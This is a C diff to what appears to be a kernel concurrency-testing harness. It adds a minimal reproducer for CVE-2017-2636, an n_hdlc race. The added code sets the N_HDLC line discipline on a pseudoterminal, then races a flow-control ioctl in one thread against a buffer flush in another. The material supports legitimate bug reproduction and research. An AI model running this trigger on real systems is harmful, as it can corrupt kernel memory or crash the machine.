@@ -9,9 +9,11 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
+#include <termios.h>
 #include <unistd.h>
 
 #ifdef VERBOSE
@@ -37,7 +39,7 @@ enum qcschedpoint_footprint {
     footprint_not_addressed,
 };
 
-int predicted_fd = -1;
+int fd0 = -1;
 int vm;
 
 #include "hypercall.h"
@@ -95,6 +97,9 @@ struct schedpoint sched1[] = {
 #if defined(BYPASS_TEST) || defined(FOOTPRINT_TEST)
 #include "schedpoint/bypass-1.h"
 #endif
+#if defined(CVE20172636_MINIMAL)
+#include "schedpoint/cve-2017-2636-minimal-1.h"
+#endif
 };
 
 struct schedpoint sched2[] = {
@@ -109,6 +114,9 @@ struct schedpoint sched2[] = {
 #endif
 #if defined(BYPASS_TEST) || defined(FOOTPRINT_TEST)
 #include "schedpoint/bypass-2.h"
+#endif
+#if defined(CVE20172636_MINIMAL)
+#include "schedpoint/cve-2017-2636-minimal-2.h"
 #endif
 };
 
@@ -202,6 +210,9 @@ static void *th1(void *gop)
                                    .flags = 0};
     ioctl(vm, KVM_CREATE_DEVICE, &cd);
 #endif
+#if defined(CVE20172636_MINIMAL)
+    ioctl(fd0, TCXONC, TCOON);
+#endif
 #if defined(SIMPLE_TEST) || defined(BYPASS_TEST) || defined(SPINLOCK_TEST) ||  \
     defined(FOOTPRINT_TEST)
     int typ = 1;
@@ -224,7 +235,10 @@ static void *th2(void *gop)
 
     install_schedpoint(sched2, sizeof(sched2) / sizeof(sched2[0]));
 #if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
-    close(predicted_fd);
+    close(fd0);
+#endif
+#if defined(CVE20172636_MINIMAL)
+    ioctl(fd0, TCFLSH, TCIOFLUSH);
 #endif
 #if defined(SIMPLE_TEST) || defined(BYPASS_TEST) || defined(SPINLOCK_TEST) ||  \
     defined(FOOTPRINT_TEST)
@@ -257,15 +271,31 @@ static void init()
     print_sched(2, sched2, sizeof(sched2) / sizeof(sched2[0]));
 #endif
 #if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
-    predicted_fd = -1;
+    fd0 = -1;
     int kvm = open("/dev/kvm", O_RDWR);
     if (kvm == -1)
         perror("open");
     vm = ioctl(kvm, KVM_CREATE_VM, 0);
     if (vm == -1)
         perror("KVM_CREATE_VM");
-    predicted_fd = dup(0);
-    close(predicted_fd);
+    fd0 = dup(0);
+    close(fd0);
+#endif
+#if defined(CVE20172636_MINIMAL)
+    int n_hdlc = N_HDLC;
+    char buf[100];
+    memset(buf, 'a', 100);
+    fd0 = open("/dev/ptmx", O_RDWR);
+    ioctl(fd0, TIOCSETD, &n_hdlc);
+    ioctl(fd0, TCXONC, TCOOFF);
+    write(fd0, buf, 100);
+#endif
+}
+
+static void fini()
+{
+#if defined(CVE20172636_MINIMAL)
+    close(fd0);
 #endif
 }
 
@@ -295,6 +325,8 @@ int main(void)
 
         pthread_join(pth1, &ret1);
         pthread_join(pth2, &ret2);
+
+        fini();
 
 #ifdef TEST_REPEAT
         if ((bool)!ret1 && (bool)!ret2)
